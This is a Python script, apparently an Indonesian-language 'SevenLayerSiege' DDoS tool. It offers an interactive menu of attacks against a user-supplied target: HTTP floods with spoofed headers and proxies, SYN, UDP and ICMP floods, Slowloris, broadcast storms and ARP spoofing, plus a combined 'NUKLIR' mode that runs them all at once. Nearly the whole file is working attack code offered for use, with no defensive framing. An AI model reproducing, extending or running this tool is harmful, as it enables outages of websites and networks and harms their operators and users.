#!/usr/bin/env python3
# edi.py - Ry7's 7 Layer DDoS Tool
# Untuk penggunaan internal RY7 saja

import threading
import socket
import random
import requests
import time
import sys
import os
from scapy.all import *
from urllib.parse import urlparse
import socks
import ssl

# Konfigurasi default
target_url = ""
target_ip = ""
port = 80
threads = 500
duration = 60
proxy_list = []

# Banner
def banner():
    os.system("clear")
    print("""
    ███████╗██████╗ ██╗
    ██╔════╝██╔══██╗██║
    █████╗  ██║  ██║██║
    ██╔══╝  ██║  ██║██║
    ███████╗██████╔╝██║
    ╚══════╝╚═════╝ ╚═╝
    SevenLayerSiege - Ry7's Attacker
    """)

# Layer 7: HTTP Flood dengan proxy & spoofed headers
def http_flood(target, proxy=None):
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
        ]),
        "Accept": "*/*",
        "Accept-Language": "id-ID,id;q=0.9",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    }
    try:
        if proxy:
            proxies = {"http": proxy, "https": proxy}
            requests.get(target, headers=headers, proxies=proxies, timeout=3, verify=False)
        else:
            requests.get(target, headers=headers, timeout=3, verify=False)
    except:
        pass

# Layer 4: SYN Flood (perlu root) + UDP Flood
def syn_flood(ip, port):
    packet = IP(dst=ip)/TCP(dport=port, flags="S", seq=random.randint(1,100000))
    send(packet, verbose=False, loop=0)

def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while True:
        sock.sendto(data, (ip, port))

# Layer 3: ICMP Flood
def icmp_flood(ip):
    packet = IP(dst=ip)/ICMP()
    send(packet, verbose=False, loop=0)

# Layer 2 & 1: MAC Flooding & ARP Spoof (butuh interface)
def mac_flood(iface="eth0"):
    # Broadcast storm
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/ICMP()
    sendp(packet, iface=iface, loop=1, verbose=False)

def arp_attack(target_ip, gateway_ip, iface="eth0"):
    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
    send(arp_response, iface=iface, loop=1, verbose=False)

# Slowloris (Layer 7 partial)
def slowloris(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {target_ip}\r\n".encode())
        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
        sock.send("Accept-language: en-US,en\r\n".encode())
        while True:
            sock.send(f"X-{random.randint(0,5000)}: {random.randint(0,5000)}\r\n".encode())
            time.sleep(5)
    except:
        pass

# Multi-threaded executor
def run_attack(method, target, port, threads):
    print(f"[+] Menjalankan {method} -> {target}:{port} dengan {threads} threads")
    for _ in range(threads):
        if method == "http":
            t = threading.Thread(target=http_flood, args=(target,))
        elif method == "syn":
            t = threading.Thread(target=syn_flood, args=(target, port))
        elif method == "udp":
            t = threading.Thread(target=udp_flood, args=(target, port))
        elif method == "icmp":
            t = threading.Thread(target=icmp_flood, args=(target,))
        elif method == "slowloris":
            t = threading.Thread(target=slowloris, args=(target, port))
        elif method == "mac":
            t = threading.Thread(target=mac_flood)
        elif method == "arp":
            # butuh gateway
            gw = input("Gateway IP: ")
            t = threading.Thread(target=arp_attack, args=(target, gw))
        else:
            print("Metode tidak dikenal")
            return
        t.daemon = True
        t.start()
    time.sleep(duration)
    print("[+] Attack selesai.")

def main():
    banner()
    print("Pilih metode serangan 7 layer:")
    print("1. HTTP Flood (Layer 7)")
    print("2. SYN Flood (Layer 4)")
    print("3. UDP Flood (Layer 4)")
    print("4. ICMP Flood (Layer 3)")
    print("5. Slowloris (Layer 7 partial)")
    print("6. MAC Flood (Layer 2) - butuh root & interface")
    print("7. ARP Spoof (Layer 2) - butuh root")
    print("8. ALL LAYERS KOMBINASI (NUKLIR)")
    pilih = input(">> ")

    target = input("Target URL atau IP: ")
    if target.startswith("http"):
        parsed = urlparse(target)
        target_ip = socket.gethostbyname(parsed.netloc)
        target_url = target
    else:
        target_ip = target
        target_url = f"http://{target}"

    port = int(input("Port (default 80): ") or 80)
    threads = int(input("Jumlah threads (default 500): ") or 500)
    global duration
    duration = int(input("Durasi serangan (detik): ") or 60)

    if pilih == "8":
        # Jalankan semua layer secara paralel
        for _ in range(threads//7):
            threading.Thread(target=http_flood, args=(target_url,)).start()
            threading.Thread(target=syn_flood, args=(target_ip, port)).start()
            threading.Thread(target=udp_flood, args=(target_ip, port)).start()
            threading.Thread(target=icmp_flood, args=(target_ip,)).start()
            threading.Thread(target=slowloris, args=(target_ip, port)).start()
            threading.Thread(target=mac_flood, args=("wlan0",)).start()
            # ARP skip karena butuh gateway
        print("NUKLIR MODE dijalankan selama", duration, "detik")
        time.sleep(duration)
    else:
        methods = {
            "1": "http",
            "2": "syn",
            "3": "udp",
            "4": "icmp",
            "5": "slowloris",
            "6": "mac",
            "7": "arp"
        }
        method = methods.get(pilih, "http")
        run_attack(method, target_ip if method not in ["http","slowloris"] else target_url, port, threads)

if __name__ == "__main__":
    main()
